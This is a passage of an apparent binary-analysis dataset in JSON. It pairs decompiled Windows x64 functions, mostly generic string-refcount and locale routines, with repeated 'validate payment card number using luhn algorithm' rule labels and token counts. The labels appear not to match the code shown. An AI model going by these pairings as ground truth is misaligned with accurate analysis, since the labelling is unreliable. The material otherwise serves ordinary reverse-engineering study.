        "decompiled_code": "\nuint fcn.140015a50(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint uVar1;\n    \n    fcn.14001dd40(arg1);\n    uVar1 = fcn.1400199a0(0x6000, arg1, 0, arg2);\n    fcn.14001ddb0(arg1);\n    return uVar1;\n}\n",
        "token_count": 87
    },
    "140015b0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140015b00(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.1400199a0(0x4000, arg1, 0, arg2);\n    *(arg1 + iVar1) = 0;\n    return;\n}\n",
        "token_count": 75
    },
    "140018c0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.140018c00(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    int64_t *arg1_00;\n    uint64_t arg2;\n    uchar *puVar5;\n    uchar *puVar6;\n    ulong auStack96 [5];\n    uchar auStack56 [6];\n    uint16_t uStack50;\n    ulong uStack48;\n    ulong var_8h;\n    \n    if (*(arg1 + 0x14) == -3) {\n        uStack48 = 0;\n        auStack96[0] = 0x140018d01;\n        puVar4 = sub.msvcrt.dll_localeconv();\n        arg1_00 = &stack0xffffffffffffffce;\n        auStack96[0] = 0x140018d16;\n        iVar1 = fcn.14001e240(arg1_00, *puVar4, 0x10, &stack0xffffffffffffffd0);\n        if (iVar1 < 1) {\n            uStack50 = *(arg1 + 3);\n        }\n        else {\n            *(arg1 + 3) = uStack50;\n        }\n        *(arg1 + 0x14) = iVar1;\n    }\n    else {\n        uStack50 = *(arg1 + 3);\n        arg1_00 = arg1;\n    }\n    arg2 = uStack50;\n    if (uStack50 == 0) {\n        auStack96[0] = 0x140018cdd;\n        fcn.140017f90(0x2e, arg1);\n        return;\n    }\n    auStack96[0] = 0x140018c3d;\n    iVar3 = fcn.1400147b0(arg1_00);\n    iVar3 = -iVar3;\n    uStack48 = 0;\n    *(&stack0xffffffffffffffa0 + iVar3) = 0x140018c59;\n    iVar1 = fcn.14001dfa0(&stack0xffffffffffffffc8 + iVar3, arg2);\n    if (iVar1 < 1) {\n        *(&stack0xffffffffffffffa0 + iVar3) = 0x140018d3d;\n        fcn.140017f90(0x2e, arg1);\n    }\n    else {\n        puVar5 = &stack0xffffffffffffffc8 + iVar3;\n        do {\n            while( true ) {\n                puVar6 = puVar5 + 1;\n                if (((*(arg1 + 1) & 0x4000) != 0) ||\n                   (iVar2 = *(arg1 + 0x24),  *(arg1 + 5) != iVar2 && iVar2 <= *(arg1 + 5))) break;\ncode_r0x000140018c7a:\n                *(arg1 + 0x24) = iVar2 + 1;\n                puVar5 = puVar6;\n                if (&stack0xffffffffffffffc9 + (iVar1 - 1) + iVar3 == puVar6) {\n                    return;\n                }\n            }\n            if ((*(arg1 + 1) & 0x2000) == 0) {\n                *(*arg1 + *(arg1 + 0x24)) = *puVar5;\n                iVar2 = *(arg1 + 0x24);\n                goto code_r0x000140018c7a;\n            }\n            *(&stack0xffffffffffffffa0 + iVar3) = 0x140018cad;\n            sub.msvcrt.dll_fputc();\n            *(arg1 + 0x24) = *(arg1 + 0x24) + 1;\n            puVar5 = puVar6;\n        } while (&stack0xffffffffffffffc9 + (iVar1 - 1) + iVar3 != puVar6);\n    }\n    return;\n}\n",
        "token_count": 871
    },
    "14001dfa": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t fcn.14001dfa0(uchar *arg1, uint64_t arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar auStack29 [5];\n    \n    if (arg1 == NULL) {\n        arg1 = auStack29;\n    }\n    uVar1 = sub.msvcrt.dll____mb_cur_max_func();\n    uVar2 = sub.msvcrt.dll____lc_codepage_func();\n    iVar3 = fcn.14001df10(arg1, arg2 & 0xffff, uVar2, uVar1);\n    return iVar3;\n}\n",
        "token_count": 142
    },
    "14001f2e": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.14001f2e0(int64_t *arg1, int64_t *arg2, ulong *arg3)\n\n{\n    char cVar1;\n    ulong *puStack32;\n    \n    puStack32 = *arg3;\n    cVar1 = (**(*arg2 + 0x10))(arg2);\n    if (cVar1 != '\\0') {\n        puStack32 = *puStack32;\n    }\n    cVar1 = (**(*arg1 + 0x20))(arg1, arg2, &puStack32, 1);\n    if (cVar1 != '\\0') {\n        *arg3 = puStack32;\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "1400203b": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t fcn.1400203b0(int64_t arg1)\n\n{\n    char cVar1;\n    ulong var_10h;\n    uchar var_9h;\n    int64_t var_8h;\n    \n    var_8h = 0;\n    while( true ) {\n        var_9h = 0;\n        cVar1 = fcn.140020380(arg1 + var_8h, &var_9h);\n        if (cVar1 == '\\x01') break;\n        var_8h = var_8h + 1;\n    }\n    return var_8h;\n}\n",
        "token_count": 135
    },
    "14005ded": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.14005ded0(ulong noname_0, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char in_R9B;\n    int64_t in_stack_00000028;\n    ulong in_stack_00000030;\n    int32_t in_stack_00000038;\n    int32_t *in_stack_00000040;\n    \n    if (in_stack_00000028 != 0) {\n        iVar3 = in_stack_00000028 - in_stack_00000038;\n        uVar1 = fcn.1400b60e0(in_stack_00000030, in_R9B, arg2, arg3);\n        iVar2 = 0;\n        if (*in_stack_00000040 != iVar3) {\n            sub.msvcrt.dll_memcpy(uVar1);\n            iVar2 = *in_stack_00000040 - iVar3;\n        }\n        *in_stack_00000040 = iVar2 + (uVar1 - in_stack_00000030);\n        return;\n    }\n    iVar2 = fcn.1400b60e0(in_stack_00000030, in_R9B, arg2, arg3);\n    *in_stack_00000040 = iVar2 - in_stack_00000030;\n    return;\n}\n",
        "token_count": 292
    },
    "1400743c": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400743c0(int64_t *arg1, uint64_t arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar uStack25;\n    \n    piVar1 = *0x14010fc90;\n    iVar4 = *arg1;\n    uVar3 = *(iVar4 + -0x10);\n    if (arg2 <= uVar3) {\n        arg2 = uVar3;\n        if (**0x14010fc90 == 0) {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n        }\n        else {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n            iVar4 = *arg1;\n        }\n    }\n    iVar5 = fcn.140072b30(iVar4 + -0x18, &uStack25, arg2 - *(iVar4 + -0x18));\n    iVar4 = *arg1;\n    if (*piVar1 == 0) {\n        iVar2 = *(iVar4 + -8);\n        *(iVar4 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar4 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.1400bc6c0(iVar4 + -0x18);\n    }\n    *arg1 = iVar5;\n    return;\n}\n",
        "token_count": 361
    },
    "14007d79": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.14007d790(int64_t *arg1, uint64_t arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar uStack25;\n    \n    piVar1 = *0x14010fc90;\n    iVar4 = *arg1;\n    uVar3 = *(iVar4 + -0x10);\n    if (arg2 <= uVar3) {\n        arg2 = uVar3;\n        if (**0x14010fc90 == 0) {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n        }\n        else {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n            iVar4 = *arg1;\n        }\n    }\n    iVar5 = fcn.14007c020(iVar4 + -0x18, &uStack25, arg2 - *(iVar4 + -0x18));\n    iVar4 = *arg1;\n    if (*piVar1 == 0) {\n        iVar2 = *(iVar4 + -8);\n        *(iVar4 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar4 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.1400bc6c0(iVar4 + -0x18);\n    }\n    *arg1 = iVar5;\n    return;\n}\n",
        "token_count": 360
    },
    "140080e5": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140080e50(ulong *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uchar uStack9;\n    \n    *arg1 = 0x140117a30;\n    iVar3 = arg1[1];\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(iVar3 + -8);\n        *(iVar3 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar3 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.14007bf10(iVar3 + -0x18, &uStack9);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "140095f8": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140095f80(ulong *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uchar uStack9;\n    \n    *arg1 = 0x140117f30;\n    iVar3 = arg1[1];\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(iVar3 + -8);\n        *(iVar3 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar3 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.14007bf10(iVar3 + -0x18, &uStack9);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "1400871f": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400871f0(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int32_t *piVar3;\n    ulong in_stack_00000028;\n    uchar uStack17;\n    int64_t iStack16;\n    \n    (**(*arg2 + 0x18))(&iStack16, arg2, arg4, in_stack_00000028);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    piVar3 = *0x14010fc90;\n    if (*(iStack16 + -8) < 0) {\n        iVar2 = fcn.14007c020(iStack16 + -0x18, &uStack17, 0);\n        piVar3 = *0x14010fc90;\n    }\n    else {\n        iVar2 = iStack16;\n        if (**0x14010fc90 == 0) {\n            *(iStack16 + -8) = *(iStack16 + -8) + 1;\n        }\n        else {\n            LOCK();\n            *(iStack16 + -8) = *(iStack16 + -8) + 1;\n        }\n    }\n    *arg3 = iVar2;\n    arg3[1] = *(iStack16 + -0x18);\n    arg3[4] = 0x140086810;\n    if (*piVar3 == 0) {\n        iVar1 = *(iStack16 + -8);\n        *(iStack16 + -8) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = iStack16 + -8;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (0 < iVar1) {\n        return;\n    }\n    fcn.14007bf10(iStack16 + -0x18, &uStack17);\n    return;\n}\n",
        "token_count": 451
    },
    "14008738": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140087380(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int32_t *piVar3;\n    ulong in_stack_00000028;\n    uchar uStack17;\n    int64_t iStack16;\n    \n    (**(*arg2 + 0x18))(&iStack16, arg2, arg4, in_stack_00000028);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    piVar3 = *0x14010fc90;\n    if (*(iStack16 + -8) < 0) {\n        iVar2 = fcn.140072b30(iStack16 + -0x18, &uStack17, 0);\n        piVar3 = *0x14010fc90;\n    }\n    else {\n        iVar2 = iStack16;\n        if (**0x14010fc90 == 0) {\n            *(iStack16 + -8) = *(iStack16 + -8) + 1;\n        }\n        else {\n            LOCK();\n            *(iStack16 + -8) = *(iStack16 + -8) + 1;\n        }\n    }\n    *arg3 = iVar2;\n    arg3[1] = *(iStack16 + -0x18);\n    arg3[4] = 0x140086890;\n    if (*piVar3 == 0) {\n        iVar1 = *(iStack16 + -8);\n        *(iStack16 + -8) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = iStack16 + -8;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (0 < iVar1) {\n        return;\n    }\n    fcn.140072a10(iStack16 + -0x18, &uStack17);\n    return;\n}\n",
        "token_count": 449
    },
    "1400878f": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400878f0(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    uint64_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uchar uVar6;\n    ushort uVar7;\n    uint uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    ulong uVar11;\n    int64_t *piVar12;\n    uchar uStack289;\n    int64_t iStack288;\n    int64_t iStack272;\n    int64_t *piStack264;\n    uchar *puStack256;\n    int64_t iStack248;\n    uchar *puStack240;\n    uint64_t uStack232;\n    uchar *puStack192;\n    int64_t iStack184;\n    uchar auStack176 [16];\n    ulong uStack160;\n    int64_t *piStack152;\n    uchar *puStack144;\n    int64_t iStack136;\n    int32_t *piStack128;\n    uint64_t uStack120;\n    int64_t iStack112;\n    uchar auStack65 [9];\n    \n    puStack144 = &stack0xffffffffffffffc0;\n    iStack112 = 0x140087912;\n    uVar7 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x48) = uVar7;\n    iStack112 = 0x14008791f;\n    uVar7 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 200) = 1;\n    *(arg3 + 0x4a) = uVar7;\n    iVar5 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    iStack112 = 0x14008794e;\n    (**(iVar5 + 0x20))(puStack144, arg2);\n    iVar5 = *(auStack65._1_8_ + -0x18);\n    iStack112 = 0x140087961;\n    iStack136 = fcn.1400bc6e0(iVar5 + 1);\n    iStack112 = 0x140087975;\n    iStack272 = iVar5;\n    fcn.140024ea0(puStack144, iStack136, iVar5, 0);\n    *(iStack136 + iVar5) = 0;\n    *(arg3 + 0x18) = iVar5;\n    piStack128 = *0x14010fc90;\n    *(arg3 + 0x10) = iStack136;\n    if (*piStack128 == 0) {\n        iVar4 = *(auStack65._1_8_ + -8);\n        *(auStack65._1_8_ + -8) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = auStack65._1_8_ + -8;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        iStack112 = 0x140087ad0;\n        fcn.14007bf10(auStack65._1_8_ + -0x18, &stack0xffffffffffffffbf);\n    }\n    iStack112 = 0x1400879b9;\n    (**(*arg2 + 0x28))(puStack144, arg2);\n    iVar5 = *(auStack65._1_8_ + -0x18);\n    uStack120 = iVar5 + 1;\n    if (0x3ffffffffffffffc < uStack120) {\n        iStack112 = 0x140087b57;\n        uStack160 = fcn.1400bd850();\n        piStack264 = &stack0xffffffffffffffbf;\n        iStack112 = 0x140087b6d;\n        fcn.14007bf20(auStack65._1_8_ + -0x18);\n        iStack112 = 0x140087b75;\n        fcn.140014f30(uStack160);\n        puStack256 = &stack0xffffffffffffff40;\n        uStack232 = 0x140087ba2;\n        piStack152 = arg2;\n        iStack112 = iVar5;\n        uVar7 = (**(*piStack264 + 0x10))(piStack264);\n        *(iStack272 + 0x48) = uVar7;\n        uStack232 = 0x140087baf;\n        uVar7 = (**(*piStack264 + 0x18))(piStack264);\n        *(iStack272 + 200) = 1;\n        *(iStack272 + 0x4a) = uVar7;\n        iVar5 = *piStack264;\n        *(iStack272 + 0x10) = 0;\n        *(iStack272 + 0x28) = 0;\n        *(iStack272 + 0x38) = 0;\n        uStack232 = 0x140087bde;\n        (**(iVar5 + 0x20))(puStack256, piStack264);\n        iVar5 = iStack184;\n        uStack232 = 0x140087bed;\n        iStack248 = fcn.1400bc6e0(iStack184 + 1);\n        uStack232 = 0x140087c01;\n        iVar9 = iVar5;\n        fcn.14002f850(puStack256, iStack248, iVar5, 0);\n        *(iStack248 + iVar5) = 0;\n        *(iStack272 + 0x18) = iVar5;\n        puStack240 = &stack0xffffffffffffff50;\n        *(iStack272 + 0x10) = iStack248;\n        if (puStack192 != puStack240) {\n            uStack232 = 0x140087c23;\n            fcn.1400bc6c0();\n        }\n        uStack232 = 0x140087c2f;\n        piVar12 = piStack264;\n        (**(*piStack264 + 0x28))(puStack256);\n        iVar5 = iStack184;\n        uVar2 = iStack184 + 1;\n        if (uVar2 < 0x3ffffffffffffffd) {\n            uStack232 = 0x140087c56;\n            iVar9 = fcn.1400bc6e0(uVar2 * 2);\n            uStack232 = 0x140087c6a;\n            fcn.1400305e0(puStack256, iVar9, iVar5, 0);\n            *(iStack272 + 0x28) = iVar9;\n            *(iVar9 + -2 + uVar2 * 2) = 0;\n            *(iStack272 + 0x30) = iVar5;\n            if (puStack192 != puStack240) {\n                uStack232 = 0x140087c89;\n                fcn.1400bc6c0();\n            }\n            uStack232 = 0x140087c95;\n            (**(*piStack264 + 0x30))(puStack256, piStack264);\n            if (iStack184 + 1U < 0x3ffffffffffffffd) {\n                iVar5 = (iStack184 + 1U) * 2;\n                uStack232 = 0x140087cb8;\n                iVar9 = fcn.1400bc6e0(iVar5);\n                uStack232 = 0x140087ccc;\n                fcn.1400305e0(puStack256, iVar9, iStack184, 0);\n                *(iStack272 + 0x38) = iVar9;\n                *(iVar9 + -2 + iVar5) = 0;\n                *(iStack272 + 0x40) = iStack184;\n                if (puStack192 != puStack240) {\n                    uStack232 = 0x140087cea;\n                    fcn.1400bc6c0();\n                }\n                return;\n            }\n            uStack232 = 0x140087d2d;\n            uVar11 = fcn.1400bd850();\n            do {\n                if (puStack192 != puStack240) {\n                    uStack232 = 0x140087d11;\n                    fcn.1400bc6c0();\n                }\n                uStack232 = 0x140087d19;\n                uVar11 = fcn.140014f30(uVar11);\n            } while( true );\n        }\n        uStack232 = 0x140087d34;\n        fcn.1400bd850();\n        uStack232 = uVar2;\n        uVar6 = (**(*piVar12 + 0x10))(piVar12);\n        *(iVar9 + 0x21) = uVar6;\n        uVar6 = (**(*piVar12 + 0x18))(piVar12);\n        *(iVar9 + 0x22) = uVar6;\n        uVar8 = (**(*piVar12 + 0x40))(piVar12);\n        *(iVar9 + 0x6f) = 1;\n        *(iVar9 + 0x58) = uVar8;\n        iVar5 = *piVar12;\n        *(iVar9 + 0x10) = 0;\n        *(iVar9 + 0x28) = 0;\n        *(iVar9 + 0x38) = 0;\n        *(iVar9 + 0x48) = 0;\n        (**(iVar5 + 0x20))(&stack0xfffffffffffffee0, piVar12);\n        iVar5 = *(iStack288 + -0x18);\n        iVar10 = fcn.1400bc6e0(iVar5 + 1);\n        fcn.140024ea0(&stack0xfffffffffffffee0, iVar10, iVar5, 0);\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x18) = iVar5;\n        piVar1 = *0x14010fc90;\n        *(iVar9 + 0x10) = iVar10;\n        if (*piVar1 == 0) {\n            iVar4 = *(iStack288 + -8);\n            *(iStack288 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = iStack288 + -8;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.14007bf10(iStack288 + -0x18, &stack0xfffffffffffffedf);\n        }\n        (**(*piVar12 + 0x28))(&stack0xfffffffffffffee0, piVar12);\n        iVar5 = *(iStack288 + -0x18);\n        iVar10 = fcn.1400bc6e0(iVar5 + 1);\n        fcn.140024ea0(&stack0xfffffffffffffee0, iVar10, iVar5, 0);\n        iVar4 = *piVar1;\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x28) = iVar10;\n        *(iVar9 + 0x30) = iVar5;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack288 + -8);\n            *(iStack288 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = iStack288 + -8;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.14007bf10(iStack288 + -0x18, &stack0xfffffffffffffedf);\n        }\n        (**(*piVar12 + 0x30))(&stack0xfffffffffffffee0, piVar12);\n        iVar5 = *(iStack288 + -0x18);\n        iVar10 = fcn.1400bc6e0(iVar5 + 1);\n        fcn.140024ea0(&stack0xfffffffffffffee0, iVar10, iVar5, 0);\n        iVar4 = *piVar1;\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x38) = iVar10;\n        *(iVar9 + 0x40) = iVar5;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack288 + -8);\n            *(iStack288 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = iStack288 + -8;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.14007bf10(iStack288 + -0x18, &stack0xfffffffffffffedf);\n        }\n        (**(*piVar12 + 0x38))(&stack0xfffffffffffffee0, piVar12);\n        iVar5 = *(iStack288 + -0x18);\n        iVar10 = fcn.1400bc6e0(iVar5 + 1);\n        fcn.140024ea0(&stack0xfffffffffffffee0, iVar10, iVar5, 0);\n        iVar4 = *piVar1;\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x48) = iVar10;\n        *(iVar9 + 0x50) = iVar5;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack288 + -8);\n            *(iStack288 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack288 + -8;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.14007bf10(iStack288 + -0x18, &stack0xfffffffffffffedf);\n        }\n        uVar8 = (**(*piVar12 + 0x48))(piVar12);\n        *(iVar9 + 0x5c) = uVar8;\n        uVar8 = (**(*piVar12 + 0x50))(piVar12);\n        *(iVar9 + 0x60) = uVar8;\n        return;\n    }\n    iStack112 = 0x1400879e4;\n    iVar9 = fcn.1400bc6e0(uStack120 * 2);\n    iStack112 = 0x1400879f8;\n    fcn.140023e10(puStack144, iVar9, iVar5, 0);\n    iVar4 = *piStack128;\n    *(arg3 + 0x28) = iVar9;\n    *(iVar9 + -2 + uStack120 * 2) = 0;\n    *(arg3 + 0x30) = iVar5;\n    if (iVar4 == 0) {\n        iVar4 = *(auStack65._1_8_ + -8);\n        *(auStack65._1_8_ + -8) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = auStack65._1_8_ + -8;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        iStack112 = 0x140087b28;\n        fcn.140072a10(auStack65._1_8_ + -0x18, &stack0xffffffffffffffbf);\n    }\n    iStack112 = 0x140087a37;\n    (**(*arg2 + 0x30))(puStack144, arg2);\n    iVar5 = *(auStack65._1_8_ + -0x18);\n    if (0x3ffffffffffffffc < iVar5 + 1U) {\n        iStack112 = 0x140087b32;\n        uVar11 = fcn.1400bd850();\n        do {\n            iStack112 = 0x140087b48;\n            fcn.140072a20(auStack65._1_8_ + -0x18);\n            iStack112 = 0x140087b50;\n            uVar11 = fcn.140014f30(uVar11);\n        } while( true );\n    }\n    iVar9 = (iVar5 + 1U) * 2;\n    iStack112 = 0x140087a62;\n    iVar10 = fcn.1400bc6e0(iVar9);\n    iStack112 = 0x140087a76;\n    fcn.140023e10(puStack144, iVar10, iVar5, 0);\n    iVar4 = *piStack128;\n    *(arg3 + 0x38) = iVar10;\n    *(iVar10 + -2 + iVar9) = 0;\n    *(arg3 + 0x40) = iVar5;\n    if (iVar4 == 0) {\n        iVar4 = *(auStack65._1_8_ + -8);\n        *(auStack65._1_8_ + -8) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = auStack65._1_8_ + -8;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        iStack112 = 0x140087af4;\n        fcn.140072a10(auStack65._1_8_ + -0x18, &stack0xffffffffffffffbf);\n        return;\n    }\n    return;\n}\n",
        "token_count": 3956
    },
    "1400886e": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400886e0(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ushort uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    int64_t iVar9;\n    ulong *arg1;\n    int64_t *piVar10;\n    uchar *puStack416;\n    int64_t iStack408;\n    uchar auStack400 [24];\n    int64_t *piStack376;\n    uchar *puStack368;\n    int64_t iStack360;\n    uint64_t uStack352;\n    int32_t *piStack344;\n    int64_t iStack336;\n    uchar uStack289;\n    int64_t iStack288;\n    int64_t iStack280;\n    int64_t *piStack272;\n    uchar *puStack264;\n    int64_t iStack256;\n    uint64_t uStack248;\n    uchar *puStack240;\n    int64_t iStack232;\n    uchar *puStack192;\n    int64_t iStack184;\n    uchar auStack176 [16];\n    int64_t iStack160;\n    int64_t *piStack152;\n    uchar *puStack144;\n    int64_t iStack136;\n    uint64_t uStack128;\n    int32_t *piStack120;\n    int64_t iStack112;\n    uchar uStack65;\n    int64_t iStack64;\n    \n    puStack144 = &stack0xffffffffffffffc0;\n    iStack112 = 0x140088702;\n    uVar4 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x22) = uVar4;\n    iStack112 = 0x14008870f;\n    uVar4 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x24) = uVar4;\n    iStack112 = 0x14008871c;\n    uVar5 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x7a) = 1;\n    *(arg3 + 0x58) = uVar5;\n    iVar3 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    iStack112 = 0x14008874f;\n    (**(iVar3 + 0x20))(puStack144, arg2);\n    iVar3 = 